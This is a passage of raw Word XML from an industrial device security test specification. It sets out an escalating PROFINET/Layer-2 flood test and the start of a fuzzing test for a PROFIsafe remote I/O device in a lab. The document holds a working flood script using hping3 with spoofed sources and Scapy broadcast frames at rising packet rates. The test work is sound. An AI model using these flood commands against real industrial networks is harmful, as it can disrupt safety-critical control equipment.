              <w:t>Stop</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>confirm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acknowledged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re</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>-integration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="3CB47D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881B7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53CA6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>PASS (fail-safe interpretation)</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, at all flood levels, the device maintains safe comms or </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">passivates to outputs=Low/qualifier=bad with no </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>uncommanded</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> actuation</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (CR 3.6). </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Documented availability finding</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> sustained flooding causes continuous passivation (G-2). </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> any flood level causes an </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">undefined state or </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>uncommanded</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/unsafe output</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="73491998" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete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AC6357" w:rsidRPr="00AC6357" w14:paraId="3A735C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67DD2B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9CABB0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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="3969C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E75A0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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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370C4" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>TC-RQ010-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="622CC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6D2FD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8EB6F" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Pi eth0 = 192.168.0.100 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>flood</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> source); SPS 192.168.0.1; DUT 192.168.0.2; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>laptop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mirror</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">; DO→PLC DI </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>readback</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="3D2F7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DA6B3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1037C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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Scapy</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> / hping3 / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>packeth</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Pi); Wireshark (laptop); PLC watch-table</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6158BC58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># TC-RQ010-02 Escalating PROFINET/L2 flood; safe-state vs undefined-state</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243E6D0A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for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in 1000 10000 50000 100000; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E9CFC9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>echo "[*] flood @ ${</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">} </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D4F981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sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> timeout 30 hping3 -q -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> u$((1000000/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)) --rand-source -2 -p 34964 192.168.0.2 &amp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A74BF81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sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> python3 - &lt;&lt;'PY' &amp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE37215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from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scapy.all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> import Ether, Raw, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sendp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3F9C6EA3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>f=Ether(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ff:ff:ff:ff:ff:ff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>", type=0x8892)/Raw(b"\x00"*46)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4D4957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lastRenderedPageBreak/>
        <w:t>sendp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(f, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>="eth0", count=300000, inter=0.00001, verbose=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03037E8D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>PY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381AA916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sleep 35; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pkill</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f hping3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D57DDE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# record: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> qualifier, DO state (via PLC), device </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>operatingstate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="264AAC6E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>done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C5B854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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Safe comms maintained up to Net Load Class III limits (SRIO-1916); beyond → passivation to Low/qualifier-bad; </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no undefined/unsafe output</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; sustained flood → continuous passivation (G-2). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Safe at all levels ☐ Passivation (safe) ☐ Continuous passivation (G-2) ☐ Undefined/unsafe (FAIL) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1002_flood.pcapng, per-step qualifier/DO/state log, PLC watch-table export, FS-LED video | </w:t>
      </w:r>
      <w:hyperlink r:id="rId257" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId258" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="513D231D" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scope note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> this is the RQ-010-owned generalized flood — it </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the flood/DoS deferrals from RQ-001 (TC-RQ001-03 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>disruption→safe-state</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) and RQ-007 (generalized DoS). The </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>self-inflicted 2-connection DoS</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> remains at </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-007 (TC-RQ007-03)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId259" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3178FD02" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:pict w14:anchorId="06BE1D7D">
          <v:rect id="_x0000_i1685" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="098EF7AB" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">TC-RQ010-03 — Protocol </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Fuzzing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Robustness</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (CR 3.5 / 3.7 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>proof</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC0089A" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357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7754"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="0D96FC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16DF99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8CE0C0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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="44BE0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F5AF5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15607" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>TC-RQ010-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="1E947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04459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AE79D" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve">RQ-010 → CR 3.5 / CR 3.7 / CR 3.6 → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>Asset</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve"> H, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>Asset</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve"> A, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>Asset</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve"> E</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="5D5CF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13664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079C9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Tampering</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>malformed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t>input</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">) / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>robustness</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="53BF8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9876F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SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC635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D97A5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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Fuzzing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
